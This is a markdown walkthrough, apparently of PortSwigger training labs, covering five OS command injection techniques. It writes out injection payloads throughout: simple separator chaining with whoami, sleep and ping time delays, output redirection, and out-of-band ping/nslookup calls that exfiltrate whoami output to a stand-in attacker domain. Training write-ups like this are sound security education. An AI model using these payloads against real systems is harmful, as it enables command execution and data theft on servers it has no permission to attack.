## Summary
- [Lab1: OS command injection, simple case](https://github.com/Sec0gh/Portswigger-Labs/tree/main/OS%20Command%20Injection%20Labs#lab1-os-command-injection-simple-case)
- [Lab2: Detecting blind OS command injection using `time delays`](https://github.com/Sec0gh/Portswigger-Labs/tree/main/OS%20Command%20Injection%20Labs#lab2-detecting-blind-os-command-injection-using-time-delays)
- [Lab3: Blind OS command injection with `output redirection`](https://github.com/Sec0gh/Portswigger-Labs/tree/main/OS%20Command%20Injection%20Labs#lab3-blind-os-command-injection-with-output-redirection)
- [Lab4: Blind OS command injection with `out-of-band interaction`](https://github.com/Sec0gh/Portswigger-Labs/tree/main/OS%20Command%20Injection%20Labs#lab4-blind-os-command-injection-with-out-of-band-interaction)
- [Lab5: Blind OS command injection with `out-of-band data exfiltration`](https://github.com/Sec0gh/Portswigger-Labs/tree/main/OS%20Command%20Injection%20Labs#lab5-blind-os-command-injection-with-out-of-band-data-exfiltration)

### Lab1: OS command injection, simple case
- At the first, it is a so simple lab, because it is an `in-bind` command injection vulnerability, and we will receive the response of the command in the application when we test any payload of them.
- In the simple case we will use the `commands separators` or `shell metacharacters` in our payloads.
- Commands separators as: `&, &&, |, ||, ;, \n, $()`
- Many command injection attacks need to use the new line `\n` as URL encoding `%0a`.

```
productId=2+%26+whoami+#&storeId=1
productId=1&storeId=3|whoami
productId=1&storeId=1&&whoami
productId=1&storeId=1%26whoami%26
```
- It is important to make a URL encoding for the commands separators to obfuscate them.
- I think it is best to inject spaces to separate command line arguments and also note to convert any space to a `+` sign.

![Lab1_another_payload2.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/OS%20Command%20Injection%20Labs/images/Lab1_another_payload2.png)

-----------------------------------------------------------------------
### Lab2: Detecting blind OS command injection using `time delays`
- It is a blind command injection vulnerability, the server doesn't return the response for us when we send our command, and we won't know if it was executed or not.
- So we will use one of the techniques, which is called `trigger a time delay`.
- We will try to delay the response that we will receive to ensure the command is executed on the server by making the server ping on the localhost.
- If we tried to cause the delay in the parameters, we will find the `email` parameter is vulnerable.

```
email=injection%40gmail.com||sleep 10||subject=...
email=injection%40gmail.com||ping -c 10 127.0.0.1||subject=...
email=injection%40gmail.com & ping -c 10 127.0.0.1 #&subject=...
```
- Don't forget to make URL encodeing.

![Lab2.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/OS%20Command%20Injection%20Labs/images/Lab2.png)

-----------------------------------------------------------------------
### Lab3: Blind OS command injection with `output redirection`
- At first, we will try to confirm that there is an OS command injection vulnerability in any parameter by using time delays, I think it is the best way to detect and prove it.

![lab3_confirm.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/OS%20Command%20Injection%20Labs/images/lab3_confirm.png)
- I have seen delays in the response time, so I ensured there is a vulnerability in the `email` parameter.
- We will redirect the results of any commands which we want to do in a text file, and we will access this file to retrieve the content.

![lab3_output_redirection.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/OS%20Command%20Injection%20Labs/images/lab3_output_redirection.png)
- Now, we want to access this file in the `images` writable directory.
- If you map the application, you will notice the images directory holds all images of the application, and there is a parameter called `filename` that calls the images from the `images` directory.

![lab3_access_file.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/OS%20Command%20Injection%20Labs/images/lab3_access_file.png)

-----------------------------------------------------------------------
### Lab4: Blind OS command injection with `out-of-band interaction`
- In this technique, we will try o make the server interact with any server we can control and monitor in order to make sure that the server has sent the request to our server and executed the injected command which we passed into the web application.
- So we can use `ping` to make any request and interact with the domain of our server, or make `nslookup` for the domain to resolve it to the IP address.
- Then we will monitor whether the requests succeeded or not.

```
parameter=value || ping subdomain.webAttacker.com ||
parameter=value || nslookup subdomain.webAttacker.com ||
```
#### `Note:`
- In `lab4 & lab5`, you will use the `Burp Collaborator client`, but you must have the `Burp Suite professional`.
- But in the real world, you can use any server you can control.

-----------------------------------------------------------------------

### Lab5: Blind OS command injection with `out-of-band data exfiltration`
- In another technique, you can encapsulate your command in the injected command during executing the original command when it connects with our server.
- you will make it by using:
	- Backtick character  **\`encapsulated command\`**.
	- Dollar character **$(encapsulated command)**.

```
parameter=value || ping `whoami`.subdomain.webAttacker.com ||
parameter=value || ping $(whoami).subdomain.webAttacker.com ||
parameter=value || nslookup `whoami`.subdomain.webAttacker.com ||
parameter=value || nslookup $(whoami).subdomain.webAttacker.com ||
``` 
